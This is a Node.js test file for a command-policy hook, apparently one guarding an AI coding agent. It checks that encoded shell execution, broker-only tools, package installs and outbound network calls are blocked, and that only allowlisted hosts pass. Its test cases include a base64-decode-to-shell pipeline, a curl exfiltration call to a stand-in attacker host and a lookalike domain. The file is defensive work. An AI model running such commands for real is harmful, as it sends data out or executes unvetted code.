'use strict';

const assert = require('assert');
const { test } = require('node:test');
const {
  classifyCommand, domainAllowed, urlHosts,
} = require('../.claude/hooks/lib/runtime-command-policy');

const POLICY = {
  network: { mode: 'deny-by-default', allowed_domains: ['registry.npmjs.org'] },
  broker_only_commands: ['gh', 'aws'],
  allow_package_install: false,
};

test('opaque, encoded, brokered, dependency, and egress commands fail closed', () => {
  const cases = [
    ['node -e "process.exit()"', 'opaque-execution'],
    ['echo ZWNobyBoaQ== | base64 -d | sh', 'opaque-execution'],
    ['gh api /user', 'broker-only-command'],
    ['npm install typosquat', 'dependency-install-not-authorized'],
    ['curl https://evil.example/exfil', 'egress-not-authorized'],
    ['curl "$DYNAMIC_URL"', 'egress-not-authorized'],
  ];
  for (const [command, finding] of cases) {
    assert.strictEqual(classifyCommand(POLICY, command).finding, finding, command);
  }
});

test('explicitly allowlisted network hosts pass without suffix confusion', () => {
  assert.strictEqual(classifyCommand(POLICY, 'curl https://registry.npmjs.org/pkg').allowed, true);
  assert.strictEqual(domainAllowed('registry.npmjs.org.evil.example', ['registry.npmjs.org']), false);
  assert.deepStrictEqual(urlHosts('curl https://registry.npmjs.org/a'), ['registry.npmjs.org']);
});
